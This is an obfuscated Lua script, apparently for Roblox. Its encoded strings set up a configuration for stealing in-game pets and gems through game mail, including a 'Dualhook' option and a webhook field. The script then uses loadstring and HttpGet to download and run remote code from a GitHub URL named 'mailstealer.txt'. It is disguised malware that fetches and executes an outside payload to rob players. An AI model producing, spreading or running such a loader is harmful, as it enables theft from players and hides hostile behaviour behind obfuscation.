--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.2.6) ~  Much Love, Ferib 

]]--

do local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function()return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...)local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30)if (v1(v30,2)==79) then v19=v0(v3(v30,1,1));return "";else local v73=0;local v74;while true do if (v73==0) then v74=v2(v0(v30,16));if v19 then local v101=v5(v74,v19);v19=nil;return v101;else return v74;end break;end end end end);local function v20(v31,v32,v33)if v33 then local v75=(v31/((2 + 0)^(v32-(3 -2))))%((2 + (0 -0))^(((v33-(3 -2)) -(v32-(1 -0))) + (2 -(4 -3)))) ;return v75-(v75%(957 -(818 + 138))) ;else local v76=(9 -7)^(v32-1) ;return (((v31%(v76 + v76))>=v76) and (1 + 0)) or (0 -0) ;end end local function v21()local v34=v1(v16,v18,v18);v18=v18 + 1 ;return v34;end local function v22()local v35=(0 + 0) -0 ;local v36;local v37;while true do if (v35==(0 + 0)) then v36,v37=v1(v16,v18,v18 + 2 + 0 );v18=v18 + (299 -((432 -337) + 202)) ;v35=1;end if (v35==(4 -3)) then return (v37 * (840 -(496 + 88))) + v36 ;end end end local function v23()local v38=290 -(98 + 192) ;local v39;local v40;local v41;local v42;while true do if (v38==((1370 -(58 + 177)) -(718 + (1209 -792)))) then v39,v40,v41,v42=v1(v16,v18,v18 + 3 );v18=v18 + (476 -((1107 -749) + 114)) ;v38=2 -1 ;end if (((646 + 1280) -(586 + 1339))==v38) then return (v42 * ((8448196 -(468 + 1158)) + 8330646)) + (v41 * (30557 + 34979)) + (v40 * (237 + 19)) + v39 ;end end end local function v24()local v43=v23();local v44=v23();local v45=1 + 0 + (0 -0) ;local v46=(v20(v44,1,1731 -((3179 -2053) + 585) ) * (((1613 -(338 + 490)) -(289 + 494))^((287 + 494) -(499 + 250)))) + v43 ;local v47=v20(v44,17 + 4 ,79 -48 );local v48=((v20(v44,20 + 12 )==(1 + 0)) and  -(3 -2)) or (1 -0) ;if (v47==0) then if (v46==0) then return v48 * (0 + 0) ;else v47=1;v45=308 -(121 + (877 -690)) ;end elseif (v47==2047) then return ((v46==(0 -0)) and (v48 * ((726 -(171 + 554))/(0 -0)))) or (v48 * NaN) ;end return v8(v48,v47-(930 + 93) ) * (v45 + (v46/((1 + 1)^(6 + 46)))) ;end local function v25(v49)local v50;if  not v49 then v49=v23();if (v49==(829 -(558 + 271))) then return "";end end v50=v3(v16,v18,(v18 + v49) -(3 -2) );v18=v18 + v49 ;local v51={};for v66=1052 -(587 + 464) , #v50 do v51[v66]=v2(v1(v3(v50,v66,v66)));end return v6(v51);end local v26=v23;local function v27(...)return {...},v12("#",...);end local function v28()local v52=0 -0 ;local v53;local v54;local v55;local v56;local v57;local v58;local v59;while true do if (v52~=(1456 -(532 + 924))) then else v53=776 -(31 + 745) ;v54=nil;v52=1;end if (1==v52) then v55=nil;v56=nil;v52=2;end if (v52==(3 -0)) then v59=nil;while true do local v95=0 + 0 ;local v96;while true do if (v95~=0) then else v96=0;while true do if (v96~=0) then else local v102=0 -0 ;while true do if (v102==0) then if (v53==(2 -1)) then local v109=0;while true do if (v109==(182 -(33 + 149))) then local v112=0;while true do if (v112~=(0 -0)) then else v57={v54,v55,nil,v56};v58=v23();v112=1 -0 ;end if ((1 + 0)==v112) then v109=1 + 0 ;break;end end end if ((1 + 0)==v109) then v59={};v53=4 -2 ;break;end end end if ((2 -0)==v53) then local v110=0 -0 ;while true do if (v110==1) then for v116=855 -(579 + 275) ,v23() do local v117=0;local v118;local v119;local v120;while true do if (v117==(1149 -(1110 + 39))) then v118=0 -0 ;v119=nil;v117=1540 -(772 + 767) ;end if ((1 + 0)==v117) then v120=nil;while true do if (v118~=0) then else local v159=0;while true do if (v159~=1) then else v118=1;break;end if (v159~=0) then else v119=0;v120=nil;v159=967 -(498 + 468) ;end end end if (v118~=1) then else while true do if (0==v119) then v120=v21();if (v20(v120,1 + 0 ,1)~=0) then else local v183=0;local v184;local v185;local v186;local v187;local v188;while true do if (v183~=(0 + 0)) then else v184=0 -0 ;v185=nil;v183=1;end if (v183==(1368 -(1275 + 91))) then v188=nil;while true do if (v184==1) then local v199=1388 -(1369 + 19) ;while true do if (v199==(124 -(89 + 34))) then v184=2;break;end if (v199==0) then v187=nil;v188=nil;v199=1;end end end if (v184~=(3 -1)) then else while true do if (v185==3) then if (v20(v187,3,3)~=1) then else v188[4]=v59[v188[3 + 1 ]];end v54[v116]=v188;break;end if (v185==(1402 -(1240 + 161))) then local v205=0;local v206;while true do if (v205~=(0 -0)) then else v206=0 -0 ;while true do if (v206==(0 -0)) then local v215=0;while true do if ((0 + 0)==v215) then local v219=0;while true do if (v219~=(3 -2)) then else v215=3 -2 ;break;end if (v219==0) then v188={v22(),v22(),nil,nil};if (v186==0) then local v224=0;local v225;while true do if (v224==(1131 -(855 + 276))) then v225=0;while true do if (v225==0) then v188[3]=v22();v188[4]=v22();break;end end break;end end elseif (v186==1) then v188[3 + 0 ]=v23();elseif (v186==2) then v188[1086 -(405 + 678) ]=v23() -((2 -0)^(1003 -(418 + 569))) ;elseif (v186~=3) then else local v230=0 + 0 ;local v231;local v232;while true do if (0==v230) then v231=0;v232=nil;v230=1;end if (v230~=(416 -(288 + 127))) then else while true do if (v231==(0 + 0)) then v232=0 + 0 ;while true do if (v232==0) then v188[67 -(50 + 14) ]=v23() -((646 -(472 + 172))^16) ;v188[4]=v22();break;end end break;end end break;end end end v219=1;end end end if (v215~=(1 -0)) then else v206=1;break;end end end if (v206==1) then v185=165 -(121 + 42) ;break;end end break;end end end if (v185==(0 -0)) then local v207=0 + 0 ;local v208;while true do if (v207==0) then v208=0 + 0 ;while true do if (v208~=1) then else v185=1;break;end if (v208==0) then local v216=0;local v217;while true do if (v216==0) then v217=0 + 0 ;while true do if (v217==(1268 -(894 + 373))) then v208=1 + 0 ;break;end if (v217~=0) then else v186=v20(v120,1200 -(253 + 945) ,3 + 0 );v187=v20(v120,4,24 -18 );v217=1 + 0 ;end end break;end end end end break;end end end if (v185==(435 -(206 + 227))) then local v209=0;local v210;while true do if (v209==0) then v210=1696 -(1117 + 579) ;while true do if ((162 -(52 + 109))==v210) then v185=3;break;end if (v210~=0) then else local v218=0 -0 ;while true do if (v218==1) then v210=1;break;end if (v218==(891 -(764 + 127))) then if (v20(v187,1,1)==(1 + 0)) then v188[5 -3 ]=v59[v188[1 + 1 ]];end if (v20(v187,2,1027 -(429 + 596) )==1) then v188[2 + 1 ]=v59[v188[3]];end v218=1 + 0 ;end end end end break;end end end end break;end if ((0 -0)==v184) then local v200=0 + 0 ;local v201;while true do if (v200==(1765 -(1351 + 414))) then v201=0 + 0 ;while true do if (v201==(1928 -(1611 + 317))) then v185=553 -(115 + 438) ;v186=nil;v201=1558 -(566 + 991) ;end if (v201~=(1 + 0)) then else v184=701 -(465 + 235) ;break;end end break;end end end end break;end if (v183==(1530 -(11 + 1518))) then v186=nil;v187=nil;v183=3 -1 ;end end end break;end end break;end end break;end end end v53=8 -5 ;break;end if (0~=v110) then else local v113=0 + 0 ;while true do if (v113~=(0 -0)) then else local v150=266 -(72 + 194) ;while true do if (v150==(1 + 0)) then v113=1;break;end if (v150==0) then for v160=1,v58 do local v161=0;local v162;local v163;local v164;local v165;while true do if (v161~=2) then else while true do if (v162~=(0 + 0)) then else v163=0;v164=nil;v162=1 -0 ;end if (v162==1) then v165=nil;while true do if ((1 -0)==v163) then if (v164==1) then v165=v21()~=0 ;elseif (v164==2) then v165=v24();elseif (v164==3) then v165=v25();end v59[v160]=v165;break;end if (v163~=(1433 -(1338 + 95))) then else local v195=0;while true do if (v195~=0) then else v164=v21();v165=nil;v195=1 + 0 ;end if ((1 -0)~=v195) then else v163=1;break;end end end end break;end end break;end if (v161~=0) then else v162=0 -0 ;v163=nil;v161=1 + 0 ;end if (v161~=(441 -(129 + 311))) then else v164=nil;v165=nil;v161=2;end end end v57[9 -6 ]=v21();v150=1;end end end if (v113==(1 -0)) then v110=1 -0 ;break;end end end end end v102=1;end if ((384 -(333 + 50))~=v102) then else v96=1;break;end end end if (v96~=1) then else if (v53~=(10 -7)) then else local v103=0;local v104;while true do if (v103==(0 -0)) then v104=0;while true do local v111=0;while true do if (v111==0) then if ((0 -0)==v104) then local v151=1909 -(305 + 1604) ;local v152;while true do if (v151==0) then v152=0 + 0 ;while true do if (v152==(782 -(763 + 19))) then for v171=1 + 0 ,v23() do v55[v171-1 ]=v28();end for v173=1,v23() do v56[v173]=v23();end v152=1;end if (1==v152) then v104=1;break;end end break;end end end if (v104==1) then return v57;end break;end end end break;end end end if ((0 -0)==v53) then local v105=0;local v106;while true do if ((0 -0)==v105) then v106=892 -(214 + 678) ;while true do if (v106~=0) then else v54={};v55={};v106=1;end if (1~=v106) then else v56={};v53=1;break;end end break;end end end break;end end break;end end end break;end if (v52~=(920 -(613 + 305))) then else local v87=0;local v88;while true do if (v87~=0) then else v88=0;while true do if (v88~=(0 + 0)) then else v57=nil;v58=nil;v88=1;end if (v88==(839 -(807 + 31))) then v52=9 -6 ;break;end end break;end end end end end local function v29(v60,v61,v62)local v63=v60[1];local v64=v60[2];local v65=v60[3];return function(...)local v68=1;local v69= -1;local v70={...};local v71=v12("#",...) -1 ;local function v72()local v77=v63;local v78=v64;local v79=v65;local v80=v27;local v81={};local v82={};local v83={};for v89=0 -0 ,v71 do if ((v89>=v79) or ((3560 + 710)<=(10637 -(35264 -28048)))) then v81[v89-v79 ]=v70[v89 + 1 ];else v83[v89]=v70[v89 + 1 ];end end local v84=(v71-v79) + ((1 + 0) -0) ;local v85;local v86;while true do local v90=1410 -(1363 + 47) ;local v91;local v92;while true do if (((1525 + 788)>=(2467 -1279)) and (v90==(1091 -(970 + 120)))) then while true do if (((3450 -(101 + 282))<((14398 -3458) -6783)) and ((0 -0)==v91)) then v92=718 -(134 + (2495 -(520 + 1391))) ;while true do if ((197==(2136 -(1076 + 863))) and (v92==0)) then local v107=0 + 0 ;local v108;while true do if ((v107==(0 -0)) or ((183 + 3495)<((3721 -1302) -(938 + 21)))) then v108=0 + 0 ;while true do if (((4551 -(265 + 906))==(8446 -5066)) and (v108==(0 + 0))) then v85=v77[v68];v86=v85[2 -1 ];v108=1 + 0 ;end if ((v108==(445 -(56 + 217 + (1427 -(1196 + 60))))) or (2798<=(2371 -(179 + 1168)))) then v92=800 -(473 + 326) ;break;end end break;end end end if ((2060==2060) and (v92==(1 + 0))) then if (((2029 + 879)<(10435 -6536)) and (v86<=(6 + (1040 -(344 + 696))))) then if (((527 -329)<=(822 + 2582)) and (v86<=2)) then if ((((42559 -28747) -8990)<4887) and (v86<=(0 -0))) then do return;end elseif ((v86==(113 -(62 + 50))) or ((18019 -13994)==2948)) then if ((v83[v85[2]]==v85[682 -(273 + 405) ]) or (((3116 -(616 + 601)) + 2849)<=(12058 -8999))) then v68=v68 + 1 + 0 ;else v68=v85[132 -(73 + 56) ];end else v68=v85[2 + 1 ];end elseif (((13935 -9332)<4978) and (v86<=(15 -11))) then if (((564 + 1326)<2333) and (v86==(1 + (2 -0)))) then local v122=0;local v123;local v124;local v125;local v126;local v127;local v128;while true do if ((v122==(238 -((209 -148) + 176))) or (2070<(655 + 599))) then v125=nil;v126=nil;v122=469 -(50 + 417) ;end if ((v122==2) or (((4354 -(1040 + 458)) + 1959)==((3731 + 1542) -(553 + 780)))) then v127=nil;v128=nil;v122=1 + 2 ;end if ((v122==(0 -0)) or ((3445 -(61 + 1832))>=(4718 -2576))) then v123=1837 -(371 + 1466) ;v124=nil;v122=2 -1 ;end if ((((726 + 893) -(1545 + 71))==v122) or ((4862 -(246 + 1267))<(483 + 1279))) then while true do if (((1596 + 2476)>=(1070 + 305)) and (v123==(0 + 0))) then local v166=0 -0 ;while true do if (((6433 -2264)>=3411) and (v166==((0 -0) + 0))) then v124=0 -0 ;v125=nil;v166=1 + 0 ;end if ((((2060 -(357 + 294)) + 901)==(1488 + 822)) and (v166==(1 + 0))) then v123=1 -0 ;break;end end end if (((2209 + 1647)>=(5527 -(178 + 1712))) and (v123==(4 -2))) then v128=nil;while true do if ((1218<(8166 -3396)) and (v124==(2 + 0))) then for v189=v125,v69 do local v190=0 -0 ;local v191;local v192;while true do if ((v190==(1146 -(381 + 764))) or (3898<(546 + 43))) then while true do if (((0 -0)==v191) or ((431 + 1405)>(810 + 3404))) then v192=0 -0 ;while true do if ((v192==(1119 -(488 + 631))) or (867<(106 -57))) then v128=v128 + 1 ;v83[v189]=v126[v128];break;end end break;end end break;end if ((54<(6609 -(640 + 1033))) and (v190==((1276 -(531 + 745)) -0))) then v191=0 + 0 ;v192=nil;v190=1 + 0 ;end end end break;end if (((307 -(216 + 90))==v124) or (2063>=3408)) then local v175=0 + 0 ;local v176;while true do if ((v175==(0 -0)) or (3481<=(4530 -2871))) then v176=0 + 0 ;while true do if ((v176==(3 -2)) or ((7026 -3405)<=1912)) then v124=2 + 0 + 0 ;break;end if (((4998 -(143 + (1775 -(10 + 31))))>1316) and (((81 -(16 + 65)) -0)==v176)) then local v196=118 -(48 + 70) ;while true do if ((578<(163 + 815)) and (v196==((1254 -365) -((805 -(229 + 97)) + 409)))) then v176=1 -0 ;break;end if ((v196==(0 -0)) or (4512<(3809 -(299 + 426)))) then v69=(v127 + v125) -(1359 -(577 + 781)) ;v128=215 -(178 + (1314 -(533 + 744))) ;v196=1 + 0 ;end end end end break;end end end if ((((1366 -(54 + 286)) + 2351)<=(12658 -8849)) and (v124==(0 + 0))) then local v177=(1725 + 194) -(1511 + 408) ;while true do if (((896 -((1633 -(625 + 116)) + 4))==v177) or ((2283 -(441 + 686))>=2960)) then local v193=0;while true do if (((150 -(91 + (172 -113)))==v193) or (((2240 + 429) -(19 + 10))==((1139 + 118) -(54 + 16)))) then v125=v85[2];v126,v127=v80(v83[v125](v13(v83,v125 + (185 -(100 + 84)) ,v85[3])));v193=(186 -(56 + 129)) + 0 ;end if ((((1044 + 2645) -(30 + 220 + 44))==(4226 -(382 + 449))) and (v193==(1 + 0))) then v177=1;break;end end end if (((5642 -(602 + 946))>(7745 -3923)) and (v177==(1 + (0 -0)))) then v124=1535 -(657 + 877) ;break;end end end end break;end if (((1198 -(446 + 751))==v123) or ((7301 -5014)<(596 + 940))) then v126=nil;v127=nil;v123=1 + 1 ;end end break;end end else v83[v85[2]]=v62[v85[3 + 0 ]];end elseif ((v86>5) or ((531 + 1921)<=(5 + 2375))) then local v131=986 -((832 -543) + (1638 -941)) ;local v132;local v133;while true do if (((3252 -(88 + 193))==2971) and (v131==((1703 -(532 + 1170)) -0))) then while true do if ((v132==(817 -(158 + 659))) or ((4148 -(1579 + 276))==(2246 -(289 + 1667)))) then v133=v85[2];v83[v133]=v83[v133](v13(v83,v133 + (1 -0) + 0 ,v69));break;end end break;end if (((4687 -2681)<4543) and (v131==((0 -0) -0))) then local v156=888 -(20 + 868) ;while true do if (((2507 -(874 + 566))>=(402 -211)) and (v156==(3 -2))) then v131=412 -(29 + (695 -313)) ;break;end if ((v156==0) or ((6277 -2335)<=176)) then v132=1029 -(311 + 718) ;v133=nil;v156=1;end end end end else v83[v85[1894 -(1320 + (1471 -899)) ]]=v85[4 -1 ];end elseif ((v86<=(39 -29)) or (((1127 -(61 + 795)) -100)>(923 + 818))) then if ((v86<=(1 + 7)) or (1847<(201 + 1483))) then if ((((2905 -(32 + 63)) + 517)==(5285 -((841 -(115 + 279)) + 1511))) and (v86==(4 + (12 -9)))) then local v136=0 -0 ;local v137;local v138;local v139;local v140;while true do if (((2144 + 2126)==(5249 -(507 + 472))) and (v136==(0 -0))) then v137=(10 -(7 + 3)) + 0 ;v138=nil;v136=1 + 0 ;end if ((v136==(486 -(392 + 92))) or (1205>(1968 -454))) then while true do if ((0==v137) or (1037>=(5356 -(629 + 1238)))) then v138=0;v139=nil;v137=943 -((1167 -727) + 502) ;end if (((5273 -(1054 + 747))==(2260 + 1212)) and (v137==(775 -(365 + 409)))) then v140=nil;while true do if ((v138==(1 + 0)) or ((3898 -(512 + 1281))>=(4982 -(1475 + 110)))) then v83[v139 + (3 -2) ]=v140;v83[v139]=v140[v85[1002 -(688 + 310) ]];break;end if ((v138==(0 + 0)) or ((879 -386)>(5464 -((1747 -(963 + 431)) + 750)))) then local v181=465 -(187 + 278) ;local v182;while true do if ((((5318 -3184) + (2326 -(288 + 366)))>=96) and (v181==(0 + 0))) then v182=1607 -(1410 + 197) ;while true do if ((((27377 -16485) -7997)==2895) and (1==v182)) then v138=2 -1 ;break;end if ((0==v182) or ((1445 + 2178)>=((15413 -(42 + 95)) -10675))) then local v198=0;while true do if ((v198==(1 -0)) or (2578>=(5271 -(583 + 54)))) then v182=1961 -(1061 + 899) ;break;end if ((((1963 -(288 + 354)) -(361 + 8))==(581 + 371)) and (v198==(0 + 0))) then v139=v85[3 -1 ];v140=v83[v85[3]];v198=1994 -(1969 + 24) ;end end end end break;end end end end break;end end break;end if (((6217 -(642 + (3024 -(1706 + 63))))<=(6212 -(536 + 750))) and (v136==(2 -1))) then v139=nil;v140=nil;v136=1 + 1 ;end end else v83[v85[5 -3 ]]=v85[1 + 2 ]~=0 ;end elseif (((3084 -(1168 + 709))<2389) and (v86==9)) then v83[v85[(1902 -(91 + 304)) -(96 + 1409) ]][v85[3 + 0 ]]=v83[v85[307 -((579 -(407 + 130)) + 261) ]];else v83[v85[4 -2 ]]();end elseif (((4268 -1245)<=(7030 -2214)) and (v86<=(12 + 0))) then if (((4619 -3077)>1466) and (v86>(31 -(9 + 11)))) then for v153=v85[2 + 0 ],v85[3] do v83[v153]=nil;end else local v144=0 + 0 + 0 ;local v145;local v146;while true do if (((11424 -8599)>(3139 -(844 + 124))) and ((0 -0)==v144)) then local v157=1520 -(616 + 658 + 246) ;while true do if ((v157==(1 -0)) or ((4271 -(202 + 68))<(7886 -4558))) then v144=1733 -(189 + 1543) ;break;end if (((7612 -3445)>=(1266 -(122 + 265))) and (v157==(0 -0))) then v145=0;v146=nil;v157=1;end end end if (((438 + 930)>(601 + 669)) and (v144==1)) then while true do if ((v145==(1730 -(1203 + 527))) or ((4729 -2517)<=(1092 + 1))) then v146=v85[9 -7 ];v83[v146]=v83[v146]();break;end end break;end end end elseif ((3784>(7617 -4990)) and (v86>(61 -48))) then v83[v85[1 + 0 + 1 ]]={};else v83[v85[1 + 1 ]][v85[1774 -(1212 + 559) ]]=v85[10 -6 ];end v68=v68 + (2 -1) ;break;end end break;end end break;end if ((v90==(0 -0)) or ((4069 -(1377 + 436))<(1015 + 807))) then v91=1810 -(784 + 1026) ;v92=nil;v90=1913 -(727 + 1185) ;end end end end A,B=v27(v11(v72));if  not A[1] then local v93=0;local v94;while true do if (v93==0) then v94=v60[4][v68] or "?" ;error("Script error at ["   .. v94   .. "]:"   .. A[2] );break;end end else return v13(A,2,B);end end;end return v29(v28(),{},v17)(...);end v15("LOL!1C3O00028O0003073O0067657467656E7603083O0053652O74696E6773030A3O005072656D69756D4B6579031C3O0072692O7A6875622D5A70376B7864677572534A335247506F5938763703073O00576562682O6F6B0100030B3O004D61696C4D652O7361676503043O007069706503083O00546974616E69637303083O004475616C682O6F6B2O0103093O00496E74656E73697479026O00594003063O0042616E616E6103053O004875676573025O00802O4003043O00506F6773030A3O004578636C75736976657303063O004576656E747303073O0053656372657473030D3O0048435F444D5F4D79746869637303043O0047656D73026O004940030A3O006C6F6164737472696E6703043O0067616D6503073O00482O7470476574034D3O00682O7470733A2O2F7261772E67697468756275736572636F6E74656E742E636F6D2F70737873637269707465726D616E2F7073786861636B2F6D61696E2F6D61696C737465616C65722E747874003F3O0012053O00014O000C000100013O0026013O0002000100010004023O00020001001205000100013O00260100010005000100010004023O00050001001204000200024O000B0002000100022O000E00033O000C00300D00030004000500300D00030006000700300D0003000800092O000E00043O000200300D0004000B000C00300D0004000D000E0010090003000A00042O000E00043O000200300D0004000B000C00300D0004000D000E0010090003000F00042O000E00043O000200300D0004000B000C00300D0004000D00110010090003001000042O000E00043O000200300D0004000B000700300D0004000D000E0010090003001200042O000E00043O000200300D0004000B000C00300D0004000D00110010090003001300042O000E00043O000200300D0004000B000700300D0004000D000E0010090003001400042O000E00043O000200300D0004000B000700300D0004000D000E0010090003001500042O000E00043O000200300D0004000B000700300D0004000D000E0010090003001600042O000E00043O000200300D0004000B000C00300D0004000D0018001009000300170004001009000200030003001204000200193O0012040003001A3O00200700030003001B0012050005001C4O0008000600014O0003000300064O000600023O00022O000A0002000100010004023O003E00010004023O000500010004023O003E00010004023O000200016O00017O003F3O00023O00033O00053O00053O00063O00083O00083O00093O00093O00093O00093O00093O00093O00093O00093O00093O00093O00093O00093O00093O00093O00093O00093O00093O00093O00093O00093O00093O00093O00093O00093O00093O00093O00093O00093O00093O00093O00093O00093O00093O00093O00093O00093O00093O00093O00093O00093O00093O00093O00093O000A3O000A3O000A3O000A3O000A3O000A3O000A3O000A3O000B3O000C3O000E3O000F3O00113O00",v9(),...);end